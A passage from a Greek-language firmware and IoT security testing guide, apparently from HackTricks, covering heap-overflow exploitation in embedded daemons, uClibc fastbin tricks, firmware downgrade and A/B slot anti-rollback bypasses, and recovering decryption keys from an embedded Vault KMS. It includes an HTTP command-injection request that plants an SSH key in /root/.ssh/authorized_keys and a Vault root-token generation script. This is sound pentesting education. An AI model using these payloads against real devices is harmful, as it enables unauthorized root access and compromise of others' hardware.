3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο έναντι του **αρχικού μεγέθους της δεσμευμένης μνήμης**.

Αυτό επιτρέπει σε έναν attacker να στείλει:

- Ένα έγκυρο πρώτο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να προκαλέσει μικρή heap allocation.
- Ένα επόμενο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο packet-local μέγεθος που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να υπερχειλίζει τον αρχικά δεσμευμένο buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **emulation συσκευής** ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση model-download ή blob-download πριν από την αποστολή των malformed fragments.

### Triggers `free()` που βασίζονται στο πρωτόκολλο

Σε embedded daemons, ο ευκολότερος τρόπος να προκληθεί heap metadata exploitation συχνά δεν είναι να «περιμένετε τον καθαρισμό», αλλά να **εξαναγκάσετε τον ίδιο τον χειρισμό σφαλμάτων του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε malformed follow-up fragments για να οδηγήσετε το FSM σε καταστάσεις **retry** ή **error**.
- Υπερβείτε το όριο επαναλήψεων, ώστε το daemon να κάνει **reset context** και να απελευθερώσει τον αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε allocator-side primitives πριν καταρρεύσει η διεργασία για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **size field** ώστε να ανακατευθυνθεί η διαδρομή του allocator σε **fake chunks τοποθετημένα μέσα στον buffer που υπερχειλίστηκε**, αντί να αλλοιωθούν αμέσως πραγματικοί bin pointers και να καταρρεύσει η διεργασία.

## Εκμετάλλευση δυαδικών αρχείων και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι runtime protections για δυαδικά αρχεία είναι σπάνιες σε embedded συστήματα, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις για uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** Η uClibc χρησιμοποιεί fastbins παρόμοια με την glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, οπότε κάθε fake chunk πρέπει να περνά τους ελέγχους (έγκυρο μέγεθος, `fd = 0` και τα γειτονικά chunks να θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Non-PIE binaries υπό ASLR:** αν είναι ενεργό το ASLR αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` μέσα στο binary είναι σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε έναν **function pointer table**.
- **NUL που σταματά τον parser:** κατά την ανάλυση JSON, ένα `\x00` στο payload μπορεί να σταματήσει την ανάλυση, διατηρώντας όμως τα επόμενα bytes που ελέγχει ο attacker για ένα stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταφέρει εκεί την εκτέλεση.

## Προετοιμασμένα λειτουργικά συστήματα για ανάλυση firmware

Λειτουργικά συστήματα όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προρυθμισμένα περιβάλλοντα για δοκιμές ασφάλειας firmware, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Προετοιμασμένα OS για ανάλυση firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια διανομή που έχει σχεδιαστεί για να βοηθά στην αξιολόγηση ασφάλειας και στο penetration testing συσκευών Internet of Things (IoT). Εξοικονομεί πολύ χρόνο παρέχοντας ένα προρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία εγκατεστημένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Λειτουργικό σύστημα για δοκιμές embedded security, βασισμένο στο Ubuntu 18.04 και προεγκατεστημένο με εργαλεία δοκιμών ασφάλειας firmware.

## Επιθέσεις υποβάθμισης firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμα και όταν ένας vendor εφαρμόζει ελέγχους κρυπτογραφικών υπογραφών για τις εικόνες firmware, η **προστασία από επαναφορά έκδοσης (υποβάθμιση) συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν monotonic counter) της εικόνας που αναβοσβήνει, ένας attacker μπορεί νόμιμα να εγκαταστήσει **παλαιότερο, ευάλωτο firmware που εξακολουθεί να έχει έγκυρη υπογραφή**, επαναφέροντας έτσι vulnerabilities που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε μια παλαιότερη υπογεγραμμένη εικόνα**
   * Κατεβάστε την από τη δημόσια πύλη λήψεων, το CDN ή τον ιστότοπο υποστήριξης του vendor.
   * Εξαγάγετέ την από συνοδευτικές εφαρμογές για κινητά/desktop (π.χ. μέσα από `assets/firmware/` σε ένα Android APK).
   * Ανακτήστε την από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Μεταφορτώστε ή σερβίρετε την εικόνα στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού ενημέρωσης:
   * Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές IoT συσκευές εκθέτουν HTTP(S) endpoints *χωρίς authentication*, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν από την πλευρά του server και ξεκινούν recovery/upgrade.
3. Μετά την υποβάθμιση, εκμεταλλευτείτε ένα vulnerability που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, αναβοσβήστε ξανά την πιο πρόσφατη εικόνα ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από υποβάθμιση

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) υλικολογισμικό, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς εξυγίανση, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ, για την ενεργοποίηση πρόσβασης root μέσω SSH key). Οι νεότερες εκδόσεις υλικολογισμικού εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από υποβάθμιση καθιστά την επιδιόρθωση άχρηστη.<sup>[[4]](#references)</sup>

### Εξαγωγή υλικολογισμικού από εφαρμογές για κινητά

Πολλοί προμηθευτές ενσωματώνουν πλήρεις εικόνες υλικολογισμικού στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Παράκαμψη anti-rollback μόνο μέσω του updater σε σχεδιασμούς A/B slot

Ορισμένοι vendors εφαρμόζουν πράγματι ένα **ratchet** κατά των υποβαθμίσεων, αλλά μόνο στη λογική του *updater* (για παράδειγμα, σε μια ρουτίνα UDS μέσω CAN, μια εντολή recovery ή έναν OTA agent σε userspace). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα κατατμήσεων ή τα μεταδεδομένα του slot, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα μεταδεδομένα του firmware περιέχουν τόσο έναν περιγραφέα έκδοσης όσο και ένα **security ratchet** / μονοτονικό μετρητή.
- Ο updater συγκρίνει το ratchet του image με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα υπογεγραμμένα images.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο την κεφαλίδα, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε έναν πίνακα κατατμήσεων ή σε μετρητή generation ανά slot και **δεν συνδέεται κρυπτογραφικά** με το ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί μια primitive **επικύρωσης ενός image / εκκίνησης ενός άλλου image** σε συστήματα dual-slot. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης χρησιμοποιώντας ένα τρέχον υπογεγραμμένο image και στη συνέχεια να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader μπορεί και πάλι να εκκινήσει το υποβαθμισμένο image, επειδή εμπιστεύεται μόνο τα μεταδεδομένα του slot που έχουν ήδη δεσμευτεί.

Συνηθισμένο μοτίβο κατάχρησης:

1. Ανεβάστε ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτελέστε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνετε ακόμη επανεκκίνηση**. Επανεισέλθετε στη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλευτείτε παρωχημένη κατάσταση εκκίνησης ή λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήχθη.
4. Γράψτε σε αυτό το slot ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware.
5. Παραλείψτε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάντε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το προαχθέν slot, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Τι να αναζητήσετε κατά την αντίστροφη μηχανική υλοποιήσεων ενημέρωσης A/B:

- Επιλογή slot που προκύπτει από **flags κατά την εκκίνηση**, τα οποία δεν ανανεώνονται μετά από επιτυχή εναλλαγή.
- Ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot βάσει παρωχημένης κατάστασης αντί της **τρέχουσας δεσμευμένης διάταξης**.
- Συνάρτηση τύπου `part_write_layout()` που αυξάνει μόνο έναν **generation counter** / active flag και δεν αποθηκεύει το hash του image που επικυρώθηκε.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot σημειωμένο ως εκκινήσιμο, ακόμη κι αφού το περιεχόμενό του διαγράφηκε και ξαναγράφηκε.

### Checklist για την αξιολόγηση της λογικής ενημέρωσης

* Προστατεύονται επαρκώς η μεταφορά και η αυθεντικοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **μονοτονικό μετρητή anti-rollback** πριν από το flashing;
* Επαληθεύεται το image μέσα σε αλυσίδα secure boot (π.χ. ελέγχονται οι υπογραφές από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Συνδέονται τα μεταδεδομένα ενεργοποίησης του slot με το **validated firmware digest/version**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχή εναλλαγή slot, υποχρεώνεται η συσκευή να κάνει επανεκκίνηση ή παραμένουν προσβάσιμες μεταγενέστερες ρουτίνες ενημέρωσης/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας userland πρόσθετους ελέγχους λογικής (π.χ. επιτρεπόμενο partition map, αριθμός μοντέλου);
* Επαναχρησιμοποιούν οι ροές ενημέρωσης *μερικής* ενημέρωσης ή *backup* την ίδια λογική επικύρωσης;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στον εντοπισμό ευπαθειών σε firmware, χρησιμοποιήστε ως αφετηρία τα παρακάτω ευάλωτα projects firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν ένα image ενημέρωσης συνδυάζει μικρά μεταδεδομένα σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, εξετάστε πρώτα το container πριν δοκιμάσετε brute force:<sup>[[1]](#references)</sup>

- Κάντε dump τις κεφαλίδες, τα offsets και τα όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes είναι ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει τυχαίο κωδικό πρόσβασης firmware ή κλειδί συνεδρίας.
- Το αποσπασμένο υλικό PGP στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέτετε ότι χρησιμοποιείται για εμπιστευτικότητα.

Αν η στατική αναζήτηση κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP) αποτύχει, κάντε reverse engineering στη **λειτουργική διαδρομή αποκρυπτογράφησης** αντί να ψάχνετε μόνο για ιδιωτικά κλειδιά:

- Κάντε decompile το binary του updater / management και ακολουθήστε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το αποκρυπτογραφεί και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζητήστε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), μαζί με unit files και init scripts.
- Αντιμετωπίστε εντολές plaintext όπως `vault operator unseal ...`, recovery keys, bootstrap tokens ή τοπικά scripts αυτόματου unseal του KMS ως ισοδύναμα με υλικό ιδιωτικού κλειδιού.

Αν η συσκευή περιλαμβάνει το αρχικό binary του Vault και το storage backend, η αναπαραγωγή αυτού του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys εξαγώγιμα μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το RSA key που ανακτήθηκε με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης PKCS#1 v1.5 και αποτυχία της προεπιλεγμένης αποκρυπτογράφησης OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνηθισμένες βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του προμηθευτή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το πρόβλημα του «κρυπτογραφημένου firmware» γίνεται πιο γενικό: **ανακτήστε τα operational keys της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Παραβίαση firmware με το Claude: δεξιότητες ανώτερου επιπέδου, αυτονομία αρχάριου](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Μεθοδολογία ελέγχου ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Πρακτικό IoT Hacking: Ο οριστικός οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Εκμετάλλευση zero days σε εγκαταλελειμμένο hardware – ιστολόγιο Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Πώς μια έξυπνη συσκευή των $20 μού έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Τώρα βλέπεις το mi: τώρα έχεις γίνει pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Εκμετάλλευση του Tesla Wall Connector μέσω της θύρας φόρτισης - Μέρος 2: παράκαμψη της προστασίας κατά της υποβάθμισης](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Κάντε το να αναβοσβήνει: εκμετάλλευση του Philips Hue Bridge μέσω OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS στο QEMU, Μέρος 2: αποσφαλμάτωση και επιδιόρθωση](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
